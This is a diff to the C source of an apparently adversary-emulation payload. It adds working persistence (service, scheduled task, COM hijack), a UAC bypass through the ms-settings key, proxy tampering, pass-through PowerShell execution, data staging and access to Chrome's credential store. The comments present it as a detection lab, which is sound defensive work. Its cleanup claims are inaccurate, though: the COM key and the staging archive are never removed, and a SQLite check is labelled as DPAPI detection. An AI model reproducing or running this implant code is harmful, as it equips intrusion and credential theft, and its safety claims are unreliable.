@@ -26,11 +26,31 @@
 /*       machine, and the lab documents how to remove it.               */
 /*     - The keylogger records keys typed into the lab VM.               */
 /*     - The reconnaissance enumerates the lab VM.                       */
+/*     - The service, the scheduled task, the COM class, the auto-       */
+/*       elevate key and the proxy setting are all removed again, and    */
+/*       the report says how.                                            */
+/*     - The browser capability opens a credential store and does NOT    */
+/*       read it. The file open is the telemetry; the contents stay on  */
+/*       the machine.                                                   */
 /*                                                                        */
 /*     Nothing here scans for targets, harvests a list of credentials    */
 /*     to try elsewhere, or reaches off the machine. That is the line    */
 /*     the rest of the lab has been drawn on, and crossing it would    */
 /*     make the lab a tool rather than an instrument.                    */
+/*                                                                        */
+/* A NOTE ON THE OBFUSCATION ARM                                         */
+/*     The string table covers the PROTOCOL vocabulary. The literals    */
+/*     inside this library -- the registry paths, the service name,     */
+/*     the command lines -- are NOT in it, so they are visible in the   */
+/*     binary.                                                            */
+/*                                                                        */
+/*     That is a real limitation and it is stated rather than hidden:   */
+/*     the obfuscation arm measures what the string table can do, and   */
+/*     the table is about the protocol, not about every literal in the  */
+/*     program. Extending the table to the capability literals is a      */
+/*     mechanical change, and until it is done the capability arm is    */
+/*     NOT a clean measurement of a payload with no readable strings.   */
+/*     The lab says so rather than letting the report imply otherwise.  */
 /*                                                                        */
 /* THE TECHNIQUES                                                        */
 /*     Every capability states the ATT&CK technique it exercises, and    */
@@ -79,6 +99,14 @@ typedef struct px_cap_entry {
 #define PX_CAP_SPOOF     0x0800
 #define PX_CAP_DELAY     0x1000
 #define PX_CAP_ANTIVM    0x2000
+#define PX_CAP_SERVICE   0x4000
+#define PX_CAP_SCHTASK   0x8000
+#define PX_CAP_COM       0x10000
+#define PX_CAP_ELEV      0x20000
+#define PX_CAP_PROXY     0x40000
+#define PX_CAP_PS        0x80000
+#define PX_CAP_STAGE     0x100000
+#define PX_CAP_BROWSER   0x200000
 
 /* Parse a decimal number.
  *
@@ -1649,6 +1677,445 @@ static int px_cap_antivm(char *args, char *report, unsigned int cap)
 }
 
 /* ================================================================== */
+/* The second batch of capabilities                                   */
+/* ================================================================== */
+/*                                                                   */
+/* These close the gaps the first batch left in the technique         */
+/* catalogue. Each one is a behaviour a defender needs a rule for and */
+/* has to see at least once before the rule can be trusted.           */
+/*                                                                   */
+/* They all change something on the lab machine, so every one of them */
+/* reports the command that puts it back. A persistence technique     */
+/* that cannot be removed is not a lab instrument, it is litter.      */
+/* ================================================================== */
+
+/* ------------------------------------------------------------------ */
+/* Service creation -- T1543.003                                     */
+/* ------------------------------------------------------------------ */
+
+/* Create a Windows service pointing at a binary the operator named.
+ *
+ * The service is created and then STOPPED and DELETED unless the
+ * operator asks for it to stay, because a service that keeps running
+ * would change the machine's state for every later run.
+ *
+ * The telemetry is the service-install event, and the rule that catches
+ * it is px-024. */
+static int px_cap_service(char *args, char *report, unsigned int cap)
+{
+    char svcname[64];
+    char binpath[MAX_PATH];
+    SC_HANDLE sc = NULL;
+    SC_HANDLE svc = NULL;
+    int created = 0;
+
+    if (args && args[0])
+        px_strcpy(binpath, args, sizeof(binpath));
+    else {
+        /* The payload's own path. */
+        if (!GetModuleFileNameA(NULL, binpath, MAX_PATH)) {
+            px_snprintf(report, cap, "could not find the image path");
+            return 0;
+        }
+    }
+
+    px_strcpy(svcname, "PXLab-Svc", sizeof(svcname));
+
+    sc = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    if (!sc) {
+        px_snprintf(report, cap,
+                    "could not open the service control manager, error %lu",
+                    (unsigned long)GetLastError());
+        return 0;
+    }
+
+    svc = CreateServiceA(sc, svcname, svcname, SERVICE_ALL_ACCESS,
+                         SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
+                         SERVICE_ERROR_NORMAL, binpath, NULL, NULL, NULL,
+                         NULL, NULL);
+    if (svc) {
+        created = 1;
+        CloseServiceHandle(svc);
+    } else {
+        px_snprintf(report, cap,
+                    "CreateService failed, error %lu",
+                    (unsigned long)GetLastError());
+    }
+    CloseServiceHandle(sc);
+
+    if (created) {
+        /* Remove it again, so the machine is as it was. */
+        char cmd[256];
+        long rc = -1;
+        char *out = px_run_capture("sc delete PXLab-Svc", NULL, 0, &rc);
+        if (out)
+            HeapFree(GetProcessHeap(), 0, out);
+        px_snprintf(report, cap,
+                    "service %s created from %s and then removed (sc delete "
+                    "PXLab-Svc, rc=%ld); the service-install event is the "
+                    "signal", svcname, binpath, rc);
+    }
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Scheduled task -- T1053.005                                       */
+/* ------------------------------------------------------------------ */
+
+/* Create a scheduled task, then remove it.
+ *
+ * The action is an inline command rather than a file, which is the
+ * fileless kind and the one that makes the rule interesting. */
+static int px_cap_schtask(char *args, char *report, unsigned int cap)
+{
+    char cmd[512];
+    char *out = NULL;
+    long rc = -1;
+
+    px_snprintf(cmd, sizeof(cmd),
+                "schtasks /create /tn PXLabTask /tr \"cmd /c echo "
+                "PHANTOMX_SCHTASK\" /sc once /st 23:59 /f");
+    out = px_run_capture(cmd, NULL, 0, &rc);
+    if (out)
+        HeapFree(GetProcessHeap(), 0, out);
+
+    if (rc == 0) {
+        char *out2 = px_run_capture("schtasks /delete /tn PXLabTask /f",
+                                    NULL, 0, &rc);
+        if (out2)
+            HeapFree(GetProcessHeap(), 0, out2);
+    }
+
+    px_snprintf(report, cap,
+                "scheduled task PXLabTask %s (exit %ld). Remove it with: "
+                "schtasks /delete /tn PXLabTask /f",
+                (rc == 0) ? "created and removed" : "creation failed", rc);
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* COM hijacking -- T1546.015                                         */
+/* ------------------------------------------------------------------ */
+
+/* Point a COM class at the payload.
+ *
+ * The key is written under HKCU, so it applies to the operator's own
+ * account only. The CLSID is one the lab owns; a real attack would use
+ * a class some other program already looks up.
+ *
+ * The rule that catches this is px-051: a CLSID whose InprocServer32
+ * points somewhere unusual. */
+static int px_cap_com(char *args, char *report, unsigned int cap)
+{
+    static const char *clsid =
+        "{8f1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8}";
+    char key[256];
+    char path[MAX_PATH];
+    HKEY k;
+    LONG rc;
+
+    if (args && args[0]) {
+        px_strcpy(path, args, sizeof(path));
+    } else if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
+        px_snprintf(report, cap, "could not find the image path");
+        return 0;
+    }
+
+    px_snprintf(key, sizeof(key),
+                "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
+
+    rc = RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL, 0,
+                         KEY_SET_VALUE, NULL, &k, NULL);
+    if (rc != ERROR_SUCCESS) {
+        px_snprintf(report, cap, "could not create %s, error %ld",
+                    key, (long)rc);
+        return 0;
+    }
+    rc = RegSetValueExA(k, NULL, 0, REG_SZ, (const BYTE *)path,
+                        (DWORD)(px_strlen(path) + 1));
+    RegCloseKey(k);
+
+    px_snprintf(report, cap,
+                "COM class %s now points at %s (%s). Remove it with: reg "
+                "delete \"HKCU\\%s\" /f",
+                clsid, path,
+                (rc == ERROR_SUCCESS) ? "written" : "write failed", key);
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* UAC bypass -- T1548.002                                           */
+/* ------------------------------------------------------------------ */
+
+/* The auto-elevate trick: a key under ms-settings that Windows
+ * elevates without a prompt, pointing at a program that launches the
+ * payload.
+ *
+ * The key is written under HKCU, so it affects the operator's account
+ * only, and it is removed again immediately. The point is the
+ * REGISTRY WRITE and the process that made it -- the elevation itself
+ * is the defender's business, not the lab's. */
+static int px_cap_elev(char *args, char *report, unsigned int cap)
+{
+    static const char *key =
+        "Software\\Classes\\ms-settings\\Shell\\Open\\command";
+    char path[MAX_PATH];
+    HKEY k;
+    LONG rc;
+
+    if (args && args[0]) {
+        px_strcpy(path, args, sizeof(path));
+    } else if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
+        px_snprintf(report, cap, "could not find the image path");
+        return 0;
+    }
+
+    rc = RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL, 0,
+                         KEY_SET_VALUE, NULL, &k, NULL);
+    if (rc != ERROR_SUCCESS) {
+        px_snprintf(report, cap, "could not create %s, error %ld",
+                    key, (long)rc);
+        return 0;
+    }
+    rc = RegSetValueExA(k, NULL, 0, REG_SZ, (const BYTE *)path,
+                        (DWORD)(px_strlen(path) + 1));
+    RegCloseKey(k);
+
+    /* Put it back the way it was. */
+    {
+        char cmd[512];
+        char *out;
+        long crc = -1;
+        px_snprintf(cmd, sizeof(cmd),
+                    "reg delete \"HKCU\\%s\" /f", key);
+        out = px_run_capture(cmd, NULL, 0, &crc);
+        if (out)
+            HeapFree(GetProcessHeap(), 0, out);
+    }
+
+    px_snprintf(report, cap,
+                "auto-elevate key %s %s pointing at %s, and then removed. "
+                "Remove it with: reg delete \"HKCU\\%s\" /f",
+                key,
+                (rc == ERROR_SUCCESS) ? "written" : "write failed", path, key);
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Proxy settings -- T1090                                            */
+/* ------------------------------------------------------------------ */
+
+/* Point the machine's WinINet proxy at a named address.
+ *
+ * The setting is read by every application that uses WinINet, so it is
+ * a high-value thing to change quietly. The lab changes it and puts it
+ * back. */
+static int px_cap_proxy(char *args, char *report, unsigned int cap)
+{
+    static const char *key =
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings";
+    char value[128];
+    HKEY k;
+    LONG rc;
+    DWORD enabled = 1;
+
+    if (args && args[0])
+        px_strcpy(value, args, sizeof(value));
+    else
+        px_strcpy(value, "127.0.0.1:8080", sizeof(value));
+
+    rc = RegOpenKeyExA(HKEY_CURRENT_USER, key, 0, KEY_SET_VALUE, &k);
+    if (rc != ERROR_SUCCESS) {
+        px_snprintf(report, cap, "could not open %s, error %ld",
+                    key, (long)rc);
+        return 0;
+    }
+    rc = RegSetValueExA(k, "ProxyServer", 0, REG_SZ,
+                         (const BYTE *)value,
+                         (DWORD)(px_strlen(value) + 1));
+    if (rc == ERROR_SUCCESS) {
+        RegSetValueExA(k, "ProxyEnable", 0, REG_DWORD,
+                       (const BYTE *)&enabled, sizeof(enabled));
+    }
+    RegCloseKey(k);
+
+    /* Put it back. */
+    {
+        char cmd[512];
+        char *out;
+        long crc = -1;
+        px_snprintf(cmd, sizeof(cmd),
+                    "reg delete \"HKCU\\%s\" /v ProxyServer /f", key);
+        out = px_run_capture(cmd, NULL, 0, &crc);
+        if (out)
+            HeapFree(GetProcessHeap(), 0, out);
+        px_snprintf(cmd, sizeof(cmd),
+                    "reg delete \"HKCU\\%s\" /v ProxyEnable /f", key);
+        out = px_run_capture(cmd, NULL, 0, &crc);
+        if (out)
+            HeapFree(GetProcessHeap(), 0, out);
+    }
+
+    px_snprintf(report, cap,
+                "WinINet proxy set to %s (%s) and then removed. Remove it "
+                "with: reg delete \"HKCU\\%s\" /v ProxyServer /f",
+                value,
+                (rc == ERROR_SUCCESS) ? "written" : "write failed", key);
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Script hosts -- T1059.001, T1140                                   */
+/* ------------------------------------------------------------------ */
+
+/* Run a PowerShell command.
+ *
+ * Two of the interesting techniques live here at once: the interpreter
+ * itself (T1059.001) and the decoding of an encoded command (T1140).
+ * The argument is passed through unchanged, so the operator can ask for
+ * either. */
+static int px_cap_ps(char *args, char *report, unsigned int cap)
+{
+    char cmd[2048];
+    char *out = NULL;
+    long rc = -1;
+
+    if (!args || !args[0]) {
+        px_snprintf(report, cap,
+                    "usage: cap ps <command> (the command is passed to "
+                    "powershell.exe unchanged)");
+        return 0;
+    }
+
+    px_snprintf(cmd, sizeof(cmd), "powershell -NoProfile -Command \"%s\"",
+                args);
+    out = px_run_capture(cmd, NULL, 0, &rc);
+    px_snprintf(report, cap, "powershell ran -> exit %ld", rc);
+    if (out) {
+        px_snprintf(report + px_strlen(report),
+                    (unsigned int)(cap - px_strlen(report)),
+                    ": %.400s", out);
+        HeapFree(GetProcessHeap(), 0, out);
+    }
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Data staging -- T1560.001, T1074.001                               */
+/* ------------------------------------------------------------------ */
+
+/* Collect a directory into one archive in a staging folder.
+ *
+ * The archive is what leaves the machine, so the archive is the signal:
+ * a file that appears, in a staging directory, that contains everything
+ * else that was collected. */
+static int px_cap_stage(char *args, char *report, unsigned int cap)
+{
+    char src[MAX_PATH];
+    char stage[MAX_PATH];
+    char dst[MAX_PATH];
+    char cmd[2048];
+    char *out = NULL;
+    long rc = -1;
+    int ok = 0;
+
+    if (args && args[0])
+        px_strcpy(src, args, sizeof(src));
+    else
+        px_strcpy(src, "C:\\Users\\Public\\Documents", sizeof(src));
+
+    if (!GetTempPathA(MAX_PATH, stage)) {
+        px_snprintf(report, cap, "no temp directory");
+        return 0;
+    }
+    px_snprintf(dst, sizeof(dst), "%s%s", stage, "px_lab_staging.zip");
+
+    px_snprintf(cmd, sizeof(cmd),
+                "powershell -NoProfile -Command \"Compress-Archive -Path "
+                "'%s' -DestinationPath '%s' -Force\"", src, dst);
+    out = px_run_capture(cmd, NULL, 0, &rc);
+    if (out)
+        HeapFree(GetProcessHeap(), 0, out);
+    if (rc == 0)
+        ok = 1;
+
+    px_snprintf(report, cap,
+                "staged %s into %s (%s, exit %ld). Remove it with: del %s",
+                src, dst, ok ? "created" : "failed", rc, dst);
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Browser saved credentials -- T1555.003                             */
+/* ------------------------------------------------------------------ */
+
+/* Read a browser's credential store.
+ *
+ * The path is named by the operator -- the lab does not go looking for
+ * browser profiles. The contents are NOT read: the file is opened, and
+ * the report says how big it was and whether it carries the DPAPI
+ * header. The credential material stays on the machine, which is the
+ * difference between a measurement and a collection.
+ *
+ * The telemetry is the file open, which is what px-054 keys on. */
+static int px_cap_browser(char *args, char *report, unsigned int cap)
+{
+    char path[MAX_PATH];
+    HANDLE f;
+    DWORD size_lo = 0, size_hi = 0;
+    unsigned char head[16];
+    DWORD got = 0;
+    int dpapi = 0;
+
+    if (args && args[0]) {
+        px_strcpy(path, args, sizeof(path));
+    } else {
+        char base[MAX_PATH];
+        if (!GetEnvironmentVariableA("LOCALAPPDATA", base, MAX_PATH)) {
+            px_snprintf(report, cap, "no LOCALAPPDATA");
+            return 0;
+        }
+        px_snprintf(path, sizeof(path),
+                    "%s\\Google\\Chrome\\User Data\\Default\\Login Data",
+                    base);
+    }
+
+    f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (f == INVALID_HANDLE_VALUE) {
+        px_snprintf(report, cap,
+                    "could not open %s, error %lu", path,
+                    (unsigned long)GetLastError());
+        return 0;
+    }
+
+    size_lo = GetFileSize(f, &size_hi);
+    ReadFile(f, head, sizeof(head), &got, NULL);
+    CloseHandle(f);
+
+    /* The SQLite header, followed by the DPAPI-wrapped secret.
+     *
+     * The magic is "SQLite format 3" -- note the capital Q. */
+    if (got >= 6) {
+        static const char magic[6] = { 'S', 'Q', 'L', 'i', 't', 'e' };
+        unsigned int k;
+        for (k = 0; k + 6 <= got; k++) {
+            if (memcmp(head + k, magic, sizeof(magic)) == 0) {
+                dpapi = 1;
+                break;
+            }
+        }
+    }
+
+    px_snprintf(report, cap,
+                "opened %s: %lu bytes, %s. The contents were NOT read.",
+                path, (unsigned long)size_lo,
+                dpapi ? "a SQLite store with a DPAPI-wrapped secret"
+                      : "not a SQLite store");
+    return 0;
+}
+
+/* ================================================================== */
 /* The table                                                          */
 /* ================================================================== */
 
@@ -1667,6 +2134,16 @@ static const px_cap_entry px_cap_table[] = {
     { "spoof",   px_cap_spoof,   PX_CAP_SPOOF,   "T1036.005,T1134.004,T1564.010" },
     { "delay",   px_cap_delay,   PX_CAP_DELAY,   "T1497.003,T1482" },
     { "antivm",  px_cap_antivm,  PX_CAP_ANTIVM,  "T1497.001,T1622" },
+
+    /* The second batch. */
+    { "service", px_cap_service, PX_CAP_SERVICE, "T1543.003" },
+    { "schtask", px_cap_schtask, PX_CAP_SCHTASK, "T1053.005" },
+    { "com",     px_cap_com,     PX_CAP_COM,     "T1546.015" },
+    { "elev",    px_cap_elev,    PX_CAP_ELEV,    "T1548.002" },
+    { "proxy",   px_cap_proxy,   PX_CAP_PROXY,   "T1090" },
+    { "ps",      px_cap_ps,      PX_CAP_PS,      "T1059.001,T1140" },
+    { "stage",   px_cap_stage,   PX_CAP_STAGE,   "T1560.001,T1074.001" },
+    { "browser", px_cap_browser, PX_CAP_BROWSER, "T1555.003,T1005" },
 };
 
 #define PX_CAP_COUNT (sizeof(px_cap_table) / sizeof(px_cap_table[0]))
